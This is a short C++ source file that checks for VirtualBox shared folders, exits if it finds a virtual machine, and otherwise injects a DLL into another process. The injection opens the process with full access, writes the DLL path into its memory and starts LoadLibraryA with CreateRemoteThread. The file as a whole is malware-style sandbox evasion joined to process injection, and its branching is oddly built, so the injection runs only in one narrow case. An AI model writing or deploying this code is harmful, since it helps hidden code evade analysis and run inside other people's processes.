#define _CTR_SECURE_NO_WARNINGS
#include "windows.h"
#include "Winnetwk.h"
#include <iostream>
#include <TlHelp32.h>
int vm_detect(void)
{
	//method 9
	unsigned long pnsize = 0x1000;
	char* provider = (char*)LocalAlloc(LMEM_ZEROINIT, pnsize);
	int retv = WNetGetProviderName(WNNC_NET_RDR2SAMPLE, provider, &pnsize);
	if (retv == NO_ERROR)
	{
		if (lstrcmpi(provider, "VirtualBox Shared Folders") == 0) //searches for vm folders within the machine 
		{
			MessageBox(0, "VirtualBox detected", "waliedassar", 0);
			ExitProcess(9);
		}
		else
		{
			HWND hWnd = FindWindow(0, "Dll example");
			if (hWnd == 0) {
				std::cout << "Error, couldn't find window. Restart program." << std::endl;
				std::cin.get();
				exit(1);
			}
			else {
				std::cout << "Found dll!" << std::endl;
			}

			DWORD process_ID;
			GetWindowThreadProcessId(hWnd, &process_ID);

			HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_ID);
			if (h == 0) {
				std::cout << "Couldn't open a process" << std::endl;
				std::cin.get();
				exit(1);
			}
			else {
				std::cout << "Process opened." << std::endl;
			}

			char dll_To_Inject[] = "__DLL.dll";
			//Get address of function inside kernel32.dll
			LPVOID get_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
			if (get_Address == NULL) {
				std::cout << "Something fucked up" << std::endl;
				std::cin.get();
				exit(1);
			}
			else {
				std::cout << get_Address << std::endl;
			}

			LPVOID alloc = VirtualAllocEx(h, NULL, strlen(dll_To_Inject), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

			int memory_Writing = WriteProcessMemory(h, alloc, dll_To_Inject, strlen(dll_To_Inject), NULL);
			if (memory_Writing == NULL) {
				std::cout << "Error, exiting program" << std::endl;
				std::cin.get();
				exit(1);
			}
			else {
				std::cout << "Written to memory" << std::endl;
			}

			CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)get_Address, alloc, NULL, NULL);

			CloseHandle(h);
			std::cin.get();
		}

	}
	return 0; 
}
	
